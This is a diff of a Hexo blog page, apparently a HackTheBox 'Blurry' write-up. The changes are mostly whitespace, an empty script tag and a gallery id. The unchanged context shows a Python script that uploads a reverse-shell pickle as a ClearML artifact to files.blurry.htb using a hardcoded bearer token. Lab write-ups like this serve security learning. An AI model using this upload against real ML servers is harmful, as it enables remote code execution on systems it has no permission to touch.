@@ -63,6 +63,11 @@
 
 <meta name="generator" content="Hexo 7.1.1"></head>
 
+<script>
+
+
+
+</script>
 <body>
   
   
@@ -273,8 +278,10 @@
   </div>
 
     
-  </div>
+  </div> 
 </sidebar>
+
+
     </div>
     <div id="content-body">
        
@@ -286,7 +293,7 @@
 <div class="article-gallery">
   <div class="article-gallery-photos">
     
-      <a class="article-gallery-img" rel="gallery_cm95uvrc500273gkyamc240un">
+      <a class="article-gallery-img" rel="gallery_cmatosr250028cskye3tmequs">
         <img src="/wpimages/2024/Blurry/background.jpg" itemprop="image">
       </a>
     
@@ -349,7 +356,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests_toolbelt.multipart.encoder <span class="keyword">import</span> MultipartEncoder</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://files.blurry.htb/&#x27;</span></span><br><span class="line"></span><br><span class="line">multipart_data = MultipartEncoder(</span><br><span class="line">    fields=&#123;</span><br><span class="line">        <span class="string">&#x27;/Black Swan/Review JSON Artifacts.e49866199ce645538b859bf17b086c39/artifacts/pickle_artifact/pickle_artifact.pkl&#x27;</span>: (</span><br><span class="line">            <span class="string">&#x27;pickle_artifact.pkl&#x27;</span>,</span><br><span class="line">            <span class="built_in">open</span>(<span class="string">&#x27;./revshell&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read(),<span class="comment">#这里是我的</span></span><br><span class="line">            <span class="string">&#x27;binary/octet-stream&#x27;</span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjA1MTY4MjYsImlkZW50aXR5Ijp7InJvbGUiOiJ1c2VyIiwidXNlciI6IjRkNWYxMWY5NDBlZTRlMmE4NDFlMTY1OGQ5NzAxYWQ5IiwiY29tcGFueV9uYW1lIjoiY2xlYXJtbCIsImNvbXBhbnkiOiJkMWJkOTJhM2IwMzk0MDBjYmFmYzYwYTdhNWIxZTUyYiIsInVzZXJfbmFtZSI6InRlc3QifSwiZW52IjoiPHVua25vd24-IiwiaWF0IjoxNzE3OTI0ODI2LCJhdXRoX3R5cGUiOiJCZWFyZXIiLCJhcGlfdmVyc2lvbiI6IjIuMjciLCJzZXJ2ZXJfdmVyc2lvbiI6IjEuMTMuMSIsInNlcnZlcl9idWlsZCI6IjQyNiIsImZlYXR1cmVfc2V0IjoiYmFzaWMifQ.HTLTGznaGeTwLHRIr6m0mDsr17Leem3-iFrGitdln5M&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: multipart_data.content_type</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, headers=headers, data=multipart_data)</span><br><span class="line">re =  requests.post(url, headers=headers, data=multipart_data, proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(re.text)</span><br></pre></td></tr></table></figure>
         
       </div>
-
+      
          
     </div>
     
@@ -404,6 +411,7 @@
   </div>
 </footer>
 
+
     </div>
     <div class="back-to-top-wrapper">
     <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
@@ -432,3 +440,5 @@
   <script src="/js/light-dark-switch.js"></script>
 </body>
 </html>
+
+
